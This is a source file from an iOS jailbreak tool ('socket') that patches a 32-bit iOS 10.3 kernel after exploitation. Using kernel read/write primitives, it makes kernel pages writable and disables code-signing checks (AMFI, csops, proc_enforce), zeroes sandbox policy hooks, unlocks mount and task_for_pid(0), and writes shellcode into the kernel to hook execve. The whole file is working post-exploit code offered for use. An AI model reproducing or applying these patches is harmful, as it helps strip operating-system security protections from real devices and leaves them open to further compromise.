//
//  patches.m
//  socket
//
//  Created by staturnz on 1/24/23.
//  Copyright © 2023 Staturnz. All rights reserved.
//


#include <Foundation/Foundation.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include "exploit/s0cket.h"
#include "jailbreak.h"
#include "patches.h"
#include "common.h"


#pragma mark - [*]--   Vars and Stuff   --[*]

uint32_t amfi_file_check_mmap;
uint32_t cs_enforcement_disable_amfi;
uint32_t proc_enforce;
uint32_t ret1_gadget;
uint32_t pid_check;
uint32_t locked_task;
uint32_t i_can_has_debugger_1;
uint32_t i_can_has_debugger_2;
uint32_t mount_patch;
uint32_t vm_map_enter;
uint32_t vm_map_protect;
uint32_t vm_fault_enter;
uint32_t csops_patch;
uint32_t amfi_ret;
uint32_t amfi_cred_label_update_execve;
uint32_t amfi_vnode_check_signature;
uint32_t amfi_loadEntitlementsFromVnode;
uint32_t amfi_vnode_check_exec;
uint32_t mapForIO;
uint32_t sbcall_debugger;
uint32_t vfsContextCurrent;
uint32_t vnodeGetattr;
uint32_t _allproc;
uint32_t kernel_pmap;
uint32_t kernelConfig_stub;
uint32_t sb_ops;


#pragma mark - [*]--   Page Table Patching   --[*]

static void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
    uint32_t i = page >> 20;
    uint32_t j = (page >> 12) & 0xFF;
    uint32_t addr = tte_virt+(i<<2);
    uint32_t entry = rk32(addr);
    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
        uint32_t addr2 = page_entry+(j<<2);
        uint32_t entry2 = rk32(addr2);
        if (entry2) {
            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
            wk32(addr2, new_entry2);
        }
    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
        uint32_t new_entry = L1_PROTO_TTE(entry);
        new_entry &= ~L1_SECT_APX;
        wk32(addr, new_entry);
    }
    usleep(100000);
}


#pragma mark - [*]--   Make Wide Branch   --[*]

static unsigned int branch_wide(int pos, int tgt) {
    int delta = tgt - pos - 4;
    unsigned int i = 0;
    unsigned short pfx;
    unsigned short sfx;
    int range = 0x400000;

    if(tgt > pos) i = tgt - pos - 4;
    if(tgt < pos) i = pos - tgt - 4;
    if (i < range) {pfx = _pfx(delta); sfx = sfx_1k(delta); return b_w_ret(pfx, sfx);}
    if (range < i && i < range * 2) {delta -= range; pfx = _pfx(delta); sfx = sfx_2k(delta);return b_w_ret(pfx, sfx);}
    if (range * 2 < i && i < range * 3) {delta -= range * 2; pfx = _pfx(delta); sfx = sfx_3k(delta); return b_w_ret(pfx, sfx);}
    if (range * 3 < i && i < range * 4) {delta -= range * 3; pfx = _pfx(delta); sfx = sfx_4k(delta); return b_w_ret(pfx, sfx);}
    return -1;
}


#pragma mark - [*]--   Patch Finding   --[*]

void find_patches(uint32_t region, unsigned char *k_data, size_t ksize) {
    proc_enforce = find_proc_enforce(region, k_data, ksize);
    ret1_gadget = find_mov_r0_1_bx_lr(region, k_data, ksize);
    pid_check = find_pid_check(region, k_data, ksize);
    locked_task = find_convert_port_to_locked_task(region, k_data, ksize);
    i_can_has_debugger_1 = find_i_can_has_debugger_1_103(region, k_data, ksize);
    i_can_has_debugger_2 = find_i_can_has_debugger_2_103(region, k_data, ksize);
    mount_patch = find_mount_103(region, k_data, ksize);
    vm_map_enter = find_vm_map_enter_103(region, k_data, ksize);
    vm_map_protect = find_vm_map_protect_103(region, k_data, ksize);
    vm_fault_enter = find_vm_fault_enter_103(region, k_data, ksize);
    csops_patch = find_csops_103(region, k_data, ksize);
    amfi_ret = find_amfi_execve_ret(region, k_data, ksize);
    amfi_cred_label_update_execve = find_amfi_cred_label_update_execve(region, k_data, ksize);
    amfi_vnode_check_signature = find_amfi_vnode_check_signature(region, k_data, ksize);
    amfi_loadEntitlementsFromVnode = find_amfi_loadEntitlementsFromVnode(region, k_data, ksize);
    amfi_vnode_check_exec = find_amfi_vnode_check_exec(region, k_data, ksize);
    mapForIO = find_mapForIO_103(region, k_data, ksize);
    sbcall_debugger = find_sandbox_call_i_can_has_debugger_103(region, k_data, ksize);
    vfsContextCurrent = find_vfs_context_current(region, k_data, ksize);
    vnodeGetattr = find_vnode_getattr(region, k_data, ksize);
    _allproc = find_allproc(region, k_data, ksize);
    kernel_pmap = find_kernel_pmap(region, k_data, ksize);
    kernelConfig_stub = find_lwvm_i_can_has_krnl_conf_stub(region, k_data, ksize);
    sb_ops = find_sbops(region, k_data, ksize);
}


#pragma mark - [*]--   Patches   --[*]

static void patch_tfp0(uint32_t p, uint32_t c){
    patch_page_table(tte_virt, tte_phys, (p & ~0xFFF));wk16(p, 0xbf00);
    patch_page_table(tte_virt, tte_phys, ((c+1) & ~0xFFF));wk8(c+1, 0xe0);
    status(@"[*] tfp0: patched\n");
}

static void patch_i_can_has_debugger(uint32_t p){
    patch_page_table(tte_virt, tte_phys, (p & ~0xFFF));wk32(p, 1);
    status(@"[*] i_can_has_debugger: patched\n");
}

static void patch_vm_fault_enter(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));wk32(addr, 0x0b01f04f);
    status(@"[*] vm_fault_enter: patched\n");
}

static void patch_vm_map_enter(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));wk32(addr, 0xbf00bf00);
    status(@"[*] vm_map_enter: patched\n");
}

static void patch_vm_map_protect(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));wk32(addr, 0xbf00bf00);
    status(@"[*] vm_map_protect: patched\n");
}

static void patch_mount(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, ((addr+1) & ~0xFFF));wk8((addr+1), 0xe0);
    status(@"[*] mount: patched\n");
}

static void patch_sbcall_debugger(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));wk32(addr, 0xbf00bf00);
    status(@"[*] sbcall_debugger: patched\n");
}

static void patch_csops(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if((addr & ~0xFFF) != ((addr+4) & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4) & ~0xFFF));
    wk32(addr, 0xbf00bf00);wk16(addr+4, 0xbf00);
    status(@"[*] csops: patched\n");
}

static void patch_mapForIO(uint32_t addr, uint32_t ptr, uint32_t ret1){
    patch_page_table(tte_virt, tte_phys, (ptr & ~0xFFF));
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if((addr & ~0xFFF) != ((addr+4) & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4) & ~0xFFF));
    wk32(addr, 0xbf002000);wk32(addr+4, 0xbf00bf00);wk32(ptr, ret1);
    status(@"[*] mapForIO: patched\n");
}


#pragma mark - [*]--   AMFI Patches   --[*]

void patch_amfi(void) {
    uint32_t addr_1 = amfi_ret + k_base;
    patch_page_table(tte_virt, tte_phys, (addr_1 & ~0xFFF));
    uint32_t unbase_addr = addr_1 - k_base;
    uint32_t unbase_shc = shc - k_base;
    uint32_t val = branch_wide(unbase_addr, unbase_shc);
    wk32(addr_1, val);
    status(@"[*] amfi_execve_ret: patched\n");
    
    uint32_t addr_2 = amfi_cred_label_update_execve + k_base;
    patch_page_table(tte_virt, tte_phys, (addr_2 & ~0xFFF));
    if(((addr_2+4+1) & ~0xFFF) != (addr_2 & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr_2+4+1) & ~0xFFF));
    wk32(addr_2, 0xbf00bf00);
    wk32((addr_2+4+1), 0xe0);
    status(@"[*] amfi_cred_label_update_execve: patched\n");
    
    uint32_t addr_3 = amfi_vnode_check_signature + k_base;
    patch_page_table(tte_virt, tte_phys, (addr_3 & ~0xFFF));
    if(((addr_3+0x10) & ~0xFFF) != (addr_3 & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr_3+0x10) & ~0xFFF));
    wk32(addr_3, 0xbf00bf00);
    wk32(addr_3+4, 0xbf00bf00);
    wk32(addr_3+8, 0xbf00bf00);
    wk32(addr_3+12, 0xbf00bf00);
    wk32(addr_3+16, 0xbf00bf00);
    status(@"[*] amfi_vnode_check_signature: patched\n");
    
    uint32_t addr_4 = amfi_loadEntitlementsFromVnode + k_base;
    patch_page_table(tte_virt, tte_phys, (addr_4 & ~0xFFF));
    if(((addr_4+4) & ~0xFFF) != (addr_4 & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr_4+4) & ~0xFFF));
    wk32(addr_4, 0xbf00bf00);
    wk16(addr_4+4, 0xbf00);
    wk16(addr_4+6, 0x2001);
    status(@"[*] amfi_loadEntitlementsFromVnode: patched\n");

    uint32_t addr_5 = amfi_vnode_check_exec + k_base;
    patch_page_table(tte_virt, tte_phys, (addr_5 & ~0xFFF));
    if(((addr_5+8) & ~0xFFF) != (addr_5 & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr_5+8) & ~0xFFF));
    wk32(addr_5, 0xbf00bf00);
    wk32(addr_5+4, 0xbf00bf00);
    wk32(addr_5+8, 0xbf00bf00);
    status(@"[*] amfi_vnode_check_exec: patched\n");
}


#pragma mark - [*]--   Main Patching Function   --[*]

void apply_patches(void) {
    uint32_t pmap = kernel_pmap + k_base;
    status(concat(@"[*] pmap: 0x%08x\n", pmap));
    uint32_t pmap_store = rk32(pmap);
    status(concat(@"[*] pmap store: 0x%08x\n", pmap_store));
    tte_virt = rk32(pmap_store);
    status(concat(@"[*] tte_virt: 0x%08x\n", tte_virt));
    tte_phys = rk32(pmap_store+4);
    status(concat(@"[*] tte_phys: 0x%08x\n", tte_phys));

    wk32(proc_enforce + k_base, 0);
    patch_i_can_has_debugger(i_can_has_debugger_1 + k_base);
    patch_i_can_has_debugger(i_can_has_debugger_2 + k_base);
    patch_vm_fault_enter(vm_fault_enter + k_base);
    patch_vm_map_enter(vm_map_enter + k_base);
    patch_vm_map_protect(vm_map_protect + k_base);
    patch_csops(csops_patch + k_base);
    patch_mount(mount_patch + k_base);
    patch_mapForIO(mapForIO + k_base, kernelConfig_stub + k_base, ret1_gadget + k_base);
    patch_sbcall_debugger(sbcall_debugger + k_base);
    patch_tfp0(pid_check + k_base, locked_task + k_base);
    
    uint32_t sbops = k_base + sb_ops;
    static uint32_t mpo[37] = {
        0x15c, 0x160, 0x16c, 0x470, 0x090, 0x1e0, 0x3f0, 0x3f8, 0x3fc, 0x400,
        0x404, 0x408, 0x40c, 0x410, 0x414, 0x420, 0x424, 0x42c, 0x438, 0x44c,
        0x450, 0x454, 0x458, 0x45c, 0x460, 0x464, 0x468, 0x46c, 0x4bc, 0x4f0,
        0x3d4, 0x168, 0x29c, 0x288, 0x278, 0x3e4, 0x3e8
    };
     
    for (int i = 0; i < 37; i++) wk32(sbops + mpo[i], 0);
    uint32_t execve = sbops + 0x48;
    uint32_t execve_ptr = rk32(execve);
    shc = k_base + 0xd00;
    unsigned char buf[432];
    memcpy(buf, shc_bin, 432);
    *(uint32_t*)(buf+0x019c) = k_base + vfsContextCurrent + 1;
    *(uint32_t*)(buf+0x01a0) = k_base + vnodeGetattr + 1;
    *(uint32_t*)(buf+0x01a4) = execve_ptr;
    patch_page_table(tte_virt, tte_phys, (shc & ~0xFFF));
    kwrite(shc, buf, 432);sleep(1);
    wk32(execve, (shc+4)+1);
}
